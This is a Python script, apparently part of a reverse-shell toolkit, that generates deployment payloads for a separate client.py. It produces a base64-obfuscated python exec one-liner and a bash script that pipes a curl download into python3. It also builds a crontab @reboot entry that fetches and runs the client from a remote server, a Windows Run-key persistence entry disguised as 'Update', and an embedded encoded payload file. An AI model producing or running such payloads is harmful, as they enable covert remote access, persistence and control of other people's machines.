#!/usr/bin/env python3
"""
REVERSESHELL PAYLOAD GENERATOR
Creates various deployment payloads for the reverse shell
"""

import base64
import sys
from pathlib import Path

# Read the client code
client_code = Path("client.py").read_text()


def create_one_liner(server_ip: str, port: int = 9999) -> str:
    """Create a one-liner Python payload"""
    encoded = base64.b64encode(client_code.encode()).decode()
    return f'python3 -c "import base64,subprocess;exec(base64.b64decode(\'{encoded}\'))" {server_ip} {port}'


def create_bash_download(server_ip: str, download_url: str) -> str:
    """Create a bash download and execute payload"""
    return f'''#!/bin/bash
# REVERSESHELL Payload
curl -s {download_url} | python3 - {server_ip} 9999
'''


def create_persist_linux() -> str:
    """Create a Linux persistence payload"""
    return f'''#!/bin/bash
# Add to crontab for persistence
echo "@reboot curl -s http://YOUR_SERVER/client.py | python3 - YOUR_IP 9999" | crontab -
'''


def create_persist_windows() -> str:
    """Create a Windows persistence payload"""
    return f'''@echo off
:: Add to Windows Registry for persistence
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Update" /t REG_SZ /d "python client.py YOUR_IP 9999"
'''


def create_embedded() -> str:
    """Create a fully embedded single-file payload"""
    encoded = base64.b64encode(client_code.encode()).decode()
    
    return f'''#!/usr/bin/env python3
import base64,subprocess,sys,os

# Embedded REVERSESHELL Client
CODE = base64.b64decode('''{encoded}''')

# Execute embedded code
exec(CODE)
'''


def main():
    print("🐉 REVERSESHELL Payload Generator")
    print("=" * 40)
    
    if len(sys.argv) < 2:
        print("\nUsage:")
        print("  python3 payload.py one-liner <server_ip>")
        print("  python3 payload.py embedded")
        print("  python3 payload.py bash <server_ip> <download_url>")
        print()
        print("Examples:")
        print("  python3 payload.py one-liner 192.168.1.100")
        print("  python3 payload.py embedded > payload.py")
        return
    
    command = sys.argv[1]
    
    if command == "one-liner":
        ip = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
        print("\n📝 One-liner payload:")
        print("-" * 40)
        print(create_one_liner(ip))
        print("-" * 40)
        
    elif command == "embedded":
        print(create_embedded())
        
    elif command == "bash":
        ip = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
        url = sys.argv[3] if len(sys.argv) > 3 else "http://localhost/client.py"
        print("\n📝 Bash download payload:")
        print("-" * 40)
        print(create_bash_download(ip, url))
        print("-" * 40)
        
    elif command == "persist-linux":
        print("\n📝 Linux persistence:")
        print("-" * 40)
        print(create_persist_linux())
        print("-" * 40)
        
    elif command == "persist-windows":
        print("\n📝 Windows persistence:")
        print("-" * 40)
        print(create_persist_windows())
        print("-" * 40)
        
    else:
        print(f"Unknown command: {command}")


if __name__ == "__main__":
    main()
